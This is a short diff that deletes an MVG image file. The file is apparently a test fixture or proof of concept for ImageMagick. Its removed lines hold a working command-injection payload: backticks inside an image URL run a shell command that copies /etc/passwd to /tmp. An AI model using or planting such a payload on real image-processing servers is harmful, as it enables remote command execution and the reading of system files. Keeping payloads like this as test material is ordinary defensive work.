@@ -1,4 +1,0 @@
-push graphic-context
-viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=`cat /etc/passwd > /tmp/success`'
-pop graphic-context
